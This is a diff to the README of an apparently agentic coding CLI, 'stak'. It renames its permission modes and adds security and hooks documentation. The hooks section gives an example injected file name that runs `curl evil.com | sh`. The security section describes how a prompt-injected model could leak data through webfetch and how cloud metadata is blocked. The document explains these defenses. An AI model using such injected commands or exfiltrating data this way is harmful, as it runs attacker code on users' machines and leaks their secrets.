@@ -35,7 +35,7 @@ stak -P anthropic          # override the provider (-P/--provider)
 stak --cwd ~/code/project  # operate on a specific directory instead of the current one
 stak -p "prompt"           # run one turn non-interactively and exit (-p/--print, headless mode)
 stak -p "prompt" --output-format json   # output format for --print: text (default), json, or stream-json
-stak -p "prompt" --permission-mode auto-bypass   # permission mode for --print (default: same as config; one of plan, ask, accept-edits, auto-bypass)
+stak -p "prompt" --permission-mode auto   # permission mode for --print (default: same as config; one of plan, build, auto)
 ```
 
 `stak` operates on the current directory by default. To point it at a fixed
@@ -127,8 +127,8 @@ It only applies with `--print`; passing it without `--print` is a hard error,
 the same as `--output-format` without `--print`. Headless mode has no
 interactive prompter, so by default (the project's configured permission
 mode, unless overridden here) every gated tool call is automatically denied;
-pass `--permission-mode accept-edits` or `--permission-mode auto-bypass` to
-let it actually act. This override is one-shot: it is never written to
+pass `--permission-mode build` or `--permission-mode auto` to let it actually
+act. This override is one-shot: it is never written to
 `.stak/settings.json`.
 
 ## Configuration
@@ -195,18 +195,17 @@ Every command and file change passes a permission gate before it runs.
 | Mode | Behaviour |
 | --- | --- |
 | `plan` | read-only tools work freely; every edit and command is refused outright, no prompt |
-| `ask` | prompts before edits and commands (default) |
-| `accept-edits` | edits run unattended, commands still prompt |
-| `auto-bypass` | nothing prompts |
+| `build` | edits run automatically, commands ask first (default) |
+| `auto` | nothing prompts |
 
-Commands stay gated in `accept-edits` because an edit leaves a diff you can
-read and revert, and an arbitrary shell command does not.
+Commands stay gated in `build` because an edit leaves a diff you can read and
+revert, and an arbitrary shell command does not.
 
 **Plan mode** is for exploring a change before committing to it. The model is
 told plainly that write/edit/bash are disabled and to research with
 read/grep/glob/Skill, then present a concrete plan and stop — it won't retry
 blocked tools or nag you to switch modes. Cycling to any other mode (`shift+tab`
-or `/permissions ask`) is how you approve the plan; send a follow-up message
+or `/permissions build`) is how you approve the plan; send a follow-up message
 like "go ahead" and it executes normally from there.
 
 ## Security
@@ -217,7 +216,7 @@ have access to, reach the network, install software. There is no allowlist
 or denylist of commands; pattern-matching shell input to decide what's "safe"
 is easy to get wrong and easy to bypass, so stak doesn't pretend to do it.
 Treat an approved `bash` call exactly as if you had typed it yourself, and
-lean on the permission modes above — `ask` (the default) or `plan` — rather
+lean on the permission modes above — `build` (the default) or `plan` — rather
 than assuming the tool itself limits what a command can reach.
 
 The file tools (`read`, `write`, `edit`, `glob`, `grep`) are different: they
@@ -234,17 +233,80 @@ or wrote, including file contents from your project — review before sharing
 one or committing `.stak/`.
 
 Every tool an MCP server provides is gated exactly like `bash` — it always
-prompts in `ask`/`accept-edits` and is always refused in `plan` mode, with no
+prompts in `build` and is always refused in `plan` mode, with no
 finer-grained tier. stak has no way to verify what a remote server's tool
 actually does under the hood, so it treats all of them as unsandboxed by
 default; this is deliberate, not a gap.
 
 Headless mode (`--print`) has no way to prompt for permission, so by default
 every gated tool call (`bash`, `write`, `edit`, MCP tools) is automatically
-denied — exactly as if you ran the TUI in `ask` mode with no prompter
-registered. `--permission-mode` is the explicit, one-shot way to allow more
-for a single headless invocation, and it never modifies the persisted project
-settings in `.stak/settings.json`.
+denied — exactly as if you ran the TUI with no prompter registered.
+`--permission-mode` is the explicit, one-shot way to allow more for a single
+headless invocation, and it never modifies the persisted project settings in
+`.stak/settings.json`.
+
+**Hooks only ever load from `~/.stak/config.json`, never from a project's
+`.stak/settings.json`** — see [Hooks](#hooks). A hook runs an arbitrary shell
+command, and project settings are meant to be committed and shared; honoring
+hooks from there would mean cloning a repo and running stak executed whatever
+its author wrote, with no prompt. A `hooks` block found in project settings is
+ignored with a warning.
+
+**`webfetch` cannot reach private networks.** Because it takes a
+model-chosen URL and is auto-approved as a read-only tool, it refuses any
+host that resolves to a loopback, private, CGNAT, or link-local address —
+including `169.254.169.254`, the cloud metadata endpoint that hands out
+instance credentials. Redirects are followed manually so every hop is
+re-checked, rather than letting a public URL bounce somewhere internal. Set
+`STAK_WEBFETCH_ALLOW_PRIVATE=1` to lift this when you genuinely want the
+model reading your own dev server; be aware it re-opens that reach. Note that
+the URL itself is still model-chosen, so a prompt-injected model could encode
+data into a request to a public host — treat `webfetch` as an outbound
+channel, not a read-only one.
+
+## Hooks
+
+Shell commands stak runs around each tool call — for linting after an edit,
+blocking a class of command, or logging what the model touched. Configure
+them in `~/.stak/config.json`:
+
+```json
+{
+  "hooks": {
+    "beforeTool": [
+      { "name": "no-force-push", "match": "^bash$", "run": "~/.stak/deny-force-push.sh" }
+    ],
+    "afterTool": [
+      { "name": "format", "match": "^(write|edit)$", "run": "npm run format --silent" }
+    ]
+  }
+}
+```
+
+`match` is a regex tested against the tool name (absent = every tool). `run`
+is the shell command. `timeout` caps it in milliseconds (default 10000);
+overrunning it kills the whole process tree.
+
+A **`beforeTool`** hook that exits non-zero **blocks the call** — its stderr
+becomes the reason the model is told. An **`afterTool`** hook that fails
+can't undo anything, so its stderr surfaces in the transcript as a notice
+instead. Hooks run only after the permission gate has already approved a
+call, so a hook can tighten what's allowed but never widen it.
+
+Each hook gets the invocation two ways: as JSON on stdin (`{tool, args, cwd,
+phase}`), and as environment variables — `STAK_TOOL_NAME`, `STAK_TOOL_ARGS`
+(JSON), `STAK_HOOK_PHASE`, `STAK_PROJECT_DIR`. Arguments are deliberately
+*not* substituted into the command string: tool arguments are chosen by the
+model, and the model can be steered by whatever it just read, so splicing
+them into a shell command would let a path like `x.ts"; curl evil.com | sh; #`
+run anything. Environment variables carry the same data without the shell
+ever re-parsing it as syntax.
+
+**Hooks are read only from `~/.stak/config.json`.** A `hooks` block in a
+project's `.stak/settings.json` is ignored with a warning — that file is
+committed and shared, and a committed file that can execute shell commands
+means cloning a repo and running stak runs its author's code. Move hooks you
+trust into your global config.
 
 ## Commands and skills
 
